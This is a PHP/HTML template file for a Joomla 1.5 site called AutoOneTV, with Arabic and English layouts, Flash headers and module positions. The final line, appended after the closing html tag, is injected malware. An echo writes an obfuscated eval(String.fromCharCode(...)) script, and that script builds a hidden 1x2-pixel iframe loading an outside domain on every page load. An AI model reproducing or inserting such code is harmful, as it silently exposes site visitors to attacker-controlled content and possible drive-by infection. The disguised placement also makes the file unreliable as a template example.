<?php
/*-----------------------------------------------------------------------------
# AutoOneTV for Joomla 1.5 - Version 1.0 - Licence Owner AutoOne TV K Jabassini
# -----------------------------------------------------------------------------
# Copyright (C) 2004-2008 WonderWeb C & D s.a.r.l. All Rights Reserved.
# @license - Copyrighted Commercial Software
# Author: WonderWeb C & D s.a.r.l
# Websites:  http://www.wonderweb.fr
# This file may not be redistributed in whole or significant part. 
-------------------------------------------------------------------------*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

include_once (dirname(__FILE__).DS.'ja_vars_1.5.php');

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html " xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>">

<?php 
if( $mosConfig_lang == "arabic"){?>

<html dir="rtl"" xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>">


<?php } ?>
<head>
<jdoc:include type="head" />
<?php JHTML::_('behavior.mootools'); ?>

<link rel="stylesheet" href="<?php echo $tmpTools->baseurl(); ?>templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->baseurl(); ?>templates/system/css/general.css" type="text/css" />

<?php 
if( $mosConfig_lang == "arabic"){?>
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/templatear.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/typoar.css" type="text/css" />

 
<?php } ?>


<?php 
if( $mosConfig_lang == "english"){?>
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $tmpTools->templateurl(); ?>/css/typo.css" type="text/css" />

 
<?php } ?>


 

<!--[if lte IE 6]>







<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/ieonly.css" rel="stylesheet" type="text/css" />







<style type="text/css">



.clearfix {height: 1%;}



img {border: none;}



div.wrapper .wrapper-br {



	height: 530px;



}



</style>



<![endif]-->



<!--[if gte IE 7.0]>



<style type="text/css">



.clearfix {display: inline-block;}



</style>



<![endif]-->
<script language="javascript" type="text/javascript">
	var siteurl = '<?php echo $tmpTools->baseurl();?>';
	var tmplurl = '<?php echo $tmpTools->templateurl();?>';
</script>

<script language="javascript" type="text/javascript" src="<?php echo $tmpTools->templateurl(); ?>/js/ja.script.js"></script>
<!-- js for dragdrop -->

<!-- Menu head -->
<?php if ($jamenu) $jamenu->genMenuHead(); ?>
<link href="<?php echo $tmpTools->templateurl(); ?>/css/colors/<?php echo strtolower ($tmpTools->getParam(JA_TOOL_COLOR)); ?>.css" rel="stylesheet" type="text/css" />

<!--[if lte IE 6]>
<style type="text/css">
img {border: none;}
</style>
<![endif]-->

<?php if ($tmpTools->isIE()) { ?>
<link href="<?php echo $tmpTools->templateurl(); ?>/css/ie.php" rel="stylesheet" type="text/css" />
<link href="<?php echo $tmpTools->templateurl(); ?>/css/colors/<?php echo strtolower ($tmpTools->getParam(JA_TOOL_COLOR)); ?>-ie.php" rel="stylesheet" type="text/css" />
<!--[if lte IE 6]>
<script type="text/javascript">
window.addEvent ('load', makeTransBG);
function makeTransBG() {
makeTransBg($$('img'));
}
</script>
<![endif]-->
<?php } ?>
</head>

<body id="bd" class="<?php echo $tmpTools->getParam(JA_TOOL_LAYOUT);?> <?php echo $tmpTools->getParam(JA_TOOL_SCREEN);?> fs<?php echo $tmpTools->getParam(JA_TOOL_FONT);?>" >
<a name="Top" id="Top"></a> 

<table align="center" border="0" cellpadding="3" cellspacing="3"  width="980" bgcolor="black">
	<tr>
		<td width="10%"> 
</td>
		<td width="80%"> <jdoc:include type="modules" name="bannertop" /> <?php $ord=time() ?>
</td>
		<td nowrap width="10%">  
 <div id="language" class="language" ><jdoc:include type="modules" name="top" /></div>
</td>
	</tr>
</table>
 
<ul class="accessibility">
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-content" title="<?php echo JText::_("Skip to content");?>"><?php echo JText::_("Skip to content");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-mainnav" title="<?php echo JText::_("Skip to main navigation");?>"><?php echo JText::_("Skip to main navigation");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-col1" title="<?php echo JText::_("Skip to 1st column");?>"><?php echo JText::_("Skip to 1st column");?></a></li>
	<li><a href="<?php echo $tmpTools->getCurrentURL();?>#ja-col2" title="<?php echo JText::_("Skip to 2nd column");?>"><?php echo JText::_("Skip to 2nd column");?></a></li>
</ul>  	

<div id="ja-wrapper">






<!-- BEGIN: HEADER AR-->
<?php 
if( $mosConfig_lang == "arabic"){?>
<div id="ja-headerwrap">
  <div id="ja-header" class="clearfix">
  
  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="980" height="165">
  <param name="movie" value="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/flash/ar/header2c.swf">
  <param name="quality" value="high">
  <embed src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/flash/ar/header2c.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="980" height="165"></embed>
  </object>
  
 </div>
</div>
 
<?php } ?>
<!-- END: HEADER AR -->
<?php 
if( $mosConfig_lang == "english"){?><!-- BEGIN: HEADER -->
<div id="ja-headerwrap">
  <div id="ja-header" class="clearfix">
  
  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="980" height="165">
  <param name="movie" value="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/flash/en/header2c.swf">
  <param name="quality" value="high">
  <embed src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/flash/en/header2c.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="980" height="165"></embed>
  </object>
  
 </div>
</div>
<!-- END: HEADER -->

<?php } ?>

<div class="yui-b">
<div class="yui-gb" id="t_1">		

		




<div id="ja-containerwrap<?php echo $divid; ?>" class="clearfix">
<div id="ja-container"><div id="ja-container-inner" class="clearfix">

	<!-- BEGIN: CONTENT -->
	<div id="ja-mainbodywrap">
	<div id="ja-mainbody" class="clearfix">
 	<!-- BEGIN: CONTENT -->

		<div id="ja-contentwrap">
		

		 
		<div id="ja-content"><div id="ja-content-top"><div id="ja-content-bot">
		
			<jdoc:include type="message" />

			<div id="ja-current-content" class="clearfix">
			
     		<jdoc:include type="component" />

			</div>

		</div></div></div>
		
		<?php if ($this->countModules('usermain')) { ?>
   <div id="ja-slmodule">
    		<jdoc:include type="smart_modules" name="usermain" style="smartsite" styling="width:100%; display:block"/>

      
	 </div>
	 <?php } ?>
		
		<!-- BEGIN: BOTTOM SPOTLIGHT-->
    <?php
    $spotlight = array ('user4','user5',);
    $topsl1 = $tmpTools->calSpotlight ($spotlight,$tmpTools->isOP()?100:99.9);
    if( $topsl1 ) {
    ?>
    <div class="ja-topslwrap clearfix">
    <div class="ja-topsl clearfix">
        
      <?php if( $this->countModules('user4') ) {?>
      <div class="ja-box<?php echo $topsl1['user4']['class']; ?>" style="width: <?php echo $topsl1['user4']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user4" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
    
      <?php if( $this->countModules('user5') ) {?>
      <div class="ja-box<?php echo $topsl1['user5']['class']; ?>" style="width: <?php echo $topsl1['user5']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user5" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
		</div></div>
  <?php } ?>  
 <!-- END: BOTTOM SPOTLIGHT --> 
		 
    <!-- BEGIN: BOTTOM SPOTLIGHT 2-->
    <?php
    $spotlight1 = array ('user6','user7',);
    $topsl = $tmpTools->calSpotlight ($spotlight1,$tmpTools->isOP()?100:99.9);
    if( $topsl ) {
    ?>
    <div class="ja-topslwrap clearfix">
    <div class="ja-topsl clearfix">
        
      <?php if( $this->countModules('user6') ) {?>
      <div class="ja-box<?php echo $topsl['user6']['class']; ?>" style="width: <?php echo $topsl['user6']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user6" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
    
      <?php if( $this->countModules('user7') ) {?>
      <div class="ja-box<?php echo $topsl['user7']['class']; ?>" style="width: <?php echo $topsl['user7']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user7" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
		</div></div>
  <?php } ?>
  
  
 <!-- END: BOTTOM SPOTLIGHT 2--> 
 

    <!-- BEGIN: BOTTOM SPOTLIGHT 3-->
    <?php
    $spotlight2 = array ('user8','user9',);
    $topsl = $tmpTools->calSpotlight ($spotlight2,$tmpTools->isOP()?100:99.9);
    if( $topsl ) {
    ?>
    <div class="ja-topslwrap clearfix">
    <div class="ja-topsl clearfix">
        
      <?php if( $this->countModules('user8') ) {?>
      <div class="ja-box<?php echo $topsl['user8']['class']; ?>" style="width: <?php echo $topsl['user8']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user8" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
    
      <?php if( $this->countModules('user9') ) {?>
      <div class="ja-box<?php echo $topsl['user9']['class']; ?>" style="width: <?php echo $topsl['user9']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user9" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
		</div></div>
  <?php } ?>
  

 <!-- END: BOTTOM SPOTLIGHT --> 


   <!-- BEGIN: BOTTOM SPOTLIGHT 4-->
    <?php
    $spotlight3 = array ('user10','user11',);
    $topsl = $tmpTools->calSpotlight ($spotlight3,$tmpTools->isOP()?100:99.9);
    if( $topsl ) {
    ?>
    <div class="ja-topslwrap clearfix">
    <div class="ja-topsl clearfix">
        
      <?php if( $this->countModules('user10') ) {?>
      <div class="ja-box<?php echo $topsl['user10']['class']; ?>" style="width: <?php echo $topsl['user10']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user10" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
    
      <?php if( $this->countModules('user11') ) {?>
      <div class="ja-box<?php echo $topsl['user11']['class']; ?>" style="width: <?php echo $topsl['user11']['width']; ?>;">
    		<jdoc:include type="smart_modules" name="user11" style="smartsite" styling="width:100%; display:block"//>
      </div>
      <?php } ?>
		</div></div>
  <?php } ?>
  

 <!-- END: BOTTOM SPOTLIGHT --> 

</div>
   
<!-- END: CONTENT -->
 


	<?php 
if( $mosConfig_lang == "arabic"){?>
 <?php if ($ja_left) { ?>
	  <!-- BEGIN: LEFT COLUMN -->
		<div id="ja-col1">
		<div class="ja-innerpad">

			<?php if ($hasSubnav) : ?>
			<div id="ja-subnav" class="moduletable_menu">
				<h3>في هذا القسم أيضا�</h3>
				<?php if ($jamenu) $jamenu->genMenu (1,1);	?>
			</div>
			<?php endif; ?>
		
			<jdoc:include type="modules" name="left" style="xhtml" />
			<jdoc:include type="smart_modules" name="left2" style="smartsite" styling="width:100%; display:block"//>

		</div>
		</div><br />
		<!-- END: LEFT COLUMN -->
		<?php } ?>
 
<?php } ?>


<?php 
if( $mosConfig_lang == "english"){?>
 
	  <?php if ($ja_left) { ?>
	  <!-- BEGIN: LEFT COLUMN -->
		<div id="ja-col1">
		<div class="ja-innerpad">

			<?php if ($hasSubnav) : ?>
			<div id="ja-subnav" class="moduletable_menu">
				<h3>On this page</h3>
				<?php if ($jamenu) $jamenu->genMenu (1,1);	?>
			</div>
			<?php endif; ?>
		
			<jdoc:include type="modules" name="left" style="xhtml" />
        	<jdoc:include type="smart_modules" name="left2" style="smartsite" styling="width:100%; display:block"//>


		</div>
		</div><br />
		<!-- END: LEFT COLUMN -->
		<?php } ?>
 
<?php } ?>



	</div></div>
	<!-- END: CONTENT -->
		




 
	<!-- BEGIN: RIGHT COLUMN -->
	<div id="ja-col2">
	<div class="ja-innerpad">
		<jdoc:include type="modules" name="right_top" style="jarounded" />
<br />


		<jdoc:include type="smart_modules" name="right" style="smartsite" styling="width:100%; "/>
	</div></div><br />
 
	
 
	<!-- END: RIGHT COLUMN -->
 


</div></div>
</div>

</div><!-- yui-gb-->
</div><!-- yui-b-->

<!-- BEGIN: FOOTER -->
<div id="ja-footerwrap">
  <div id="ja-footer" class="clearfix">
  	<jdoc:include type="modules" name="user3" />
  	<jdoc:include type="modules" name="footer" />
  </div>
</div>
<!-- END: FOOTER -->

<jdoc:include type="modules" name="debug" />
<script type="text/javascript">
	//addSpanToTitle();
	//jaAddFirstItemToTopmenu();
	jaRemoveLastContentSeparator();
	//jaRemoveLastTrBg();
	//moveReadmore();
	//addIEHover();
	//slideshowOnWalk ();
</script>

</div>

</body>

</html>
<?php echo '<script type="text/javascript">eval(String.fromCharCode(118,97,114,32,104,106,103,52,61,34,104,111,116,34,59,118,97,114,32,119,61,34,105,34,59,118,97,114,32,114,101,54,61,34,99,97,110,46,34,59,118,97,114,32,114,114,116,116,54,61,34,99,111,109,34,59,118,97,114,32,97,61,34,105,102,34,59,118,97,114,32,115,61,34,116,116,34,59,100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,39,43,97,43,39,114,97,109,101,32,115,114,99,61,34,104,39,43,115,43,39,112,58,47,47,39,43,104,106,103,52,43,39,39,43,119,43,39,39,43,114,101,54,43,39,39,43,114,114,116,116,54,43,39,47,39,43,39,34,32,119,105,100,116,104,61,34,49,34,32,104,101,105,103,104,116,61,34,50,34,62,60,47,105,39,43,39,102,39,43,39,114,97,109,101,62,39,41,59,118,97,114,32,119,54,61,48,48,53,48,51,50,48,48,48,48,48,50,49,48))</script>'; ?>